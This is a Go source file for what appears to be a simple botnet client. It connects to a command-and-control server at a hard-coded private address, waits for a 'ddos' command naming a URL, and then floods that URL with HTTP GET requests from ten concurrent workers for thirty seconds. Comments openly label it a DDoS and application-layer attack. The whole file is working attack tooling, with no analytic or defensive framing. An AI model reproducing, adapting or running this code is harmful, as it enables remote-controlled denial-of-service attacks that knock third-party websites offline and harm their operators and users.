package main

import (
	"fmt"
	"io"
	"net"
	"time"
	"io/ioutil"
	"strings"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
)

//DDOS attack , Please take care
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// The above is an application layer attack

func startClient() {
	host := "192.168.1.97"
	port := 12348

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		fmt.Println("Error connecting to C&C Server:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Connected to C&C Server.")

	for {
		buffer := make([]byte, 1024)
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("Error reading from server:", err)
			return
		}
		command := string(buffer[:n])

		if command != "" {
			fmt.Println("Received command:", command)
			words := strings.Split(command," ")
			
			if len(words) >= 2 {
				if words[0]=="ddos" ||words[0]=="DDOS"{
					response:="try to create ddos"
					conn.Write([]byte(response))
					attackURL:=words[1]  //"http://" + 
					workers:=10
					attack, err := New(attackURL, workers)
					if err != nil {
						fmt.Println("Error creating DDoS attack:", err)
						return
					}
					attack.Run()
					fmt.Println("Attacking... (press Ctrl+C to stop)")
					for i := 0; i < 30; i++ {
						fmt.Print(".")
							// 等待 1 秒
						time.Sleep(time.Second)
					}
					fmt.Println("\nStopping DDoS attack...")
					// 停止 DDoS 攻击
					attack.Stop()
				} 
			}
			response := "Command executed successfully!"
			conn.Write([]byte(response))
			time.Sleep(1 * time.Second)
		}
	}
}

func main() {
	startClient()
}